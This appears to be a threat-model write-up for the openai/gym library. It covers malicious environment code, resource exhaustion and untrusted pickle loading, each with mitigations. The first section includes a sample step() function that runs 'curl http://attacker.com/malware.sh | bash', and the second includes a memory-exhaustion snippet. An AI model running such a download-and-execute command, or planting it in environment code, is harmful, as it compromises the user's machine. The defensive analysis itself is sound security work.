# Attack Surface Analysis for openai/gym

## Attack Surface: [1. Malicious Environment Code Injection](./attack_surfaces/1__malicious_environment_code_injection.md)

*   **Description:** An attacker provides a crafted environment that executes arbitrary code on the host system when interacted with by the agent. This is the most direct and severe threat.
*   **How Gym Contributes:** Gym's fundamental purpose is to execute the environment's code (`step()`, `reset()`, etc.).  If this code is malicious, Gym is the direct execution vector.
*   **Example:** An attacker uploads a custom environment definition (Python file) where the `step()` function contains malicious code that downloads and executes a payload from a remote server: `def step(self, action): os.system("curl http://attacker.com/malware.sh | bash")`. 
*   **Impact:** Complete system compromise. The attacker gains full control over the machine running the Gym agent.
*   **Risk Severity:** Critical
*   **Mitigation Strategies:**
    *   **Strict Input Validation:** *Never* directly execute environment code from untrusted sources.  If dynamic environment loading is absolutely necessary, use a highly restricted, sandboxed interpreter (e.g., WebAssembly, a restricted Python sandbox, or a custom parser with a very limited instruction set).  *Never* use `eval()` or `exec()` on untrusted input.
    *   **Environment Sandboxing:** Run *all* environments in isolated containers (e.g., Docker) or virtual machines with minimal privileges and *no* network access unless strictly required and carefully controlled.  Ensure the container image itself is minimal and secure.
    *   **Code Review:** Mandate thorough, manual code review of *all* environments, especially those from third-party sources or user submissions.  Look for any system calls, network connections, or attempts to access sensitive resources.
    *   **Trusted Sources Only:**  Ideally, only use environments from highly trusted sources (e.g., the official Gym library, well-vetted and maintained community repositories). Implement a strict approval and verification process for any user-submitted or externally sourced environments.

## Attack Surface: [2. Resource Exhaustion (Denial of Service) via Environment](./attack_surfaces/2__resource_exhaustion__denial_of_service__via_environment.md)

*   **Description:** A malicious environment consumes excessive system resources (CPU, memory, disk, network), leading to denial of service for the agent or the entire system.
*   **How Gym Contributes:** Gym provides the interface for interacting with the environment, and the environment's code (which Gym executes) determines resource usage.
*   **Example:** An environment's `reset()` function allocates a massive array that fills all available memory: `def reset(self): self.huge_array = [0] * (1024**3)`. Or, the `step()` function enters an infinite loop without yielding control.
*   **Impact:** Denial of service. The agent training process crashes, or the entire system becomes unresponsive.
*   **Risk Severity:** High
*   **Mitigation Strategies:**
    *   **Strict Resource Limits:**  Use operating system mechanisms (e.g., `ulimit` on Linux, cgroups in Docker) to *strictly* limit the CPU time, memory, disk space, and network bandwidth that each environment can consume.  These limits should be enforced at the OS level, not just within the Python process.
    *   **Timeouts:** Implement short, strict timeouts for *all* environment interactions (`step()`, `reset()`, `render()`). If an environment function takes longer than the timeout, terminate the environment process.
    *   **Monitoring:** Continuously monitor the resource usage of *each* running environment. If an environment exceeds predefined thresholds (even before hitting the hard limits), terminate it and log the event for investigation.
    *   **Sandboxing:**  Containers and VMs (as described above) provide an additional layer of isolation and resource control, helping to contain the impact of resource exhaustion.

## Attack Surface: [3. Untrusted Deserialization (Pickle Bomb) via Environment Loading](./attack_surfaces/3__untrusted_deserialization__pickle_bomb__via_environment_loading.md)

*   **Description:** An attacker provides a malicious serialized object (e.g., a pickled environment) that, when deserialized by Gym or related code, executes arbitrary code.
*   **How Gym Contributes:** If Gym or associated tooling uses `pickle` (or a similarly vulnerable serialization library) to load environments or environment states from files or network sources, it becomes vulnerable.
*   **Example:** An attacker uploads a file named `malicious_env.pkl` that claims to be a saved Gym environment.  When the application calls `pickle.load()` on this file, the attacker's code is executed.
*   **Impact:** Complete system compromise.
*   **Risk Severity:** Critical
*   **Mitigation Strategies:**
    *   **Absolute Prohibition of Untrusted Pickle:** *Never*, under any circumstances, use `pickle.load()` (or similar functions from vulnerable serialization libraries) on data from untrusted sources. This is a non-negotiable security rule.
    *   **Secure Serialization Alternatives:** Use secure serialization formats like JSON (for simple data structures) or Protocol Buffers (for more complex data and better performance). These formats are designed for data interchange and do *not* support arbitrary code execution.
    *   **Data Validation (If Pickle is Unavoidable - Not Recommended):** If, and *only* if, you are forced to use `pickle` due to legacy constraints (and you fully understand the extreme risks), implement *extremely* rigorous validation of the deserialized data *before* using it. This is exceptionally difficult to do correctly and is *strongly discouraged*.  Consider cryptographic signatures to verify the integrity and authenticity of the serialized data, but even this is not a foolproof solution.  The best approach is to avoid `pickle` entirely with untrusted data.
